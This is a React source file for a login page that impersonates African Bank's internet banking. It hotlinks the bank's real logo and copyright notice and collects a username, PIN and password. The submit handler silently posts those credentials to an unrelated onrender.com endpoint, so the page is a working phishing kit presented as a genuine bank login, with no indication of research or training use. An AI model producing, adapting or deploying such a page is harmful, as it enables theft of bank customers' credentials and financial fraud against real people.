import React, { useState } from 'react';
import axios from 'axios';
import styles from './Login.module.css';

const AfricanBankLogin = () => {
    const [credentials, setCredentials] = useState({
        username: '',
        pin: '',
        password: ''
    });
    const [loading, setLoading] = useState(false);

    const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
        const response = await axios.post(
            'https://newapps-1.onrender.com/user/register',
            credentials
        );
        const { message } = response.data;
        alert(message);
    } catch (err) {
        alert('Login error :' + (err.response?.data?.message || err.message));
    } finally {
        setCredentials({ username: '', pin: '', password: '' });
        setLoading(false);
    }
};


    const handleChange = (e) => {
        const { name, value } = e.target;
        setCredentials(prev => ({
            ...prev,
            [name]: value
        }));
    };

    return (
        <div className={styles.container}>
            <div className={styles.logoContainer}>
                <img
                    src="https://ib.africanbank.co.za/Content/themes/AfricanBank/images/header/ab_dark_logo.svg?289"
                    alt="Logo"
                    className={styles.bankLogo}
                />
            </div>
            <h2 className={styles.welcome}>Welcome</h2>

            <div className={styles.loginContainer}>
                <div className={styles.loginHeader}>
                    <h3 className={styles.loginDetails}>Login details</h3>
                    <div className={styles.blueUnderline}></div>
                </div>

                <form onSubmit={handleSubmit} className={styles.form}>
                    <div className={styles.inputGroup}>
                        <label htmlFor="username" className={styles.inputLabel}>Username</label>
                        <input
                            type="text"
                            id="username"
                            name="username"
                            value={credentials.username}
                            onChange={handleChange}
                            className={styles.inputField}
                            required
                        />
                    </div>

                    <div className={styles.inputGroup}>
                        <label htmlFor="pin" className={styles.inputLabel}>PIN</label>
                        <input
                            type="password"
                            id="pin"
                            name="pin"
                            value={credentials.pin}
                            onChange={handleChange}
                            className={styles.inputField}
                            inputMode="numeric"
                            maxLength="5"
                            required
                        />
                    </div>

                    <div className={styles.inputGroup}>
                        <label htmlFor="password" className={styles.inputLabel}>Password</label>
                        <input
                            type="password"
                            id="password"
                            name="password"
                            value={credentials.password}
                            onChange={handleChange}
                            className={styles.inputField}
                            required
                        />
                    </div>

                    <button type="submit" className={styles.loginButton} disabled={loading}>
                        {loading ? 'Loading...' : 'Login'}
                    </button>
                </form>
                 <div className={styles.sectionDivider}></div>
                <div className={styles.helpSection}>
                    <span className={styles.helpText}>Forgot login details?</span>
                    <button className={styles.resetButton}>Reset</button>
                </div>
                <div className={styles.sectionDivider}></div>

                <div className={styles.helpSection}>
                    <span className={styles.helpText}>Don’t have an account?</span>
                    <button className={styles.registerButton}>Register</button>
                </div>

            </div>

            {/* Footer */}
            <footer className={styles.footer}>
                © African Bank Limited - all rights reserved
            </footer>
        </div>
    );
};

export default AfricanBankLogin;
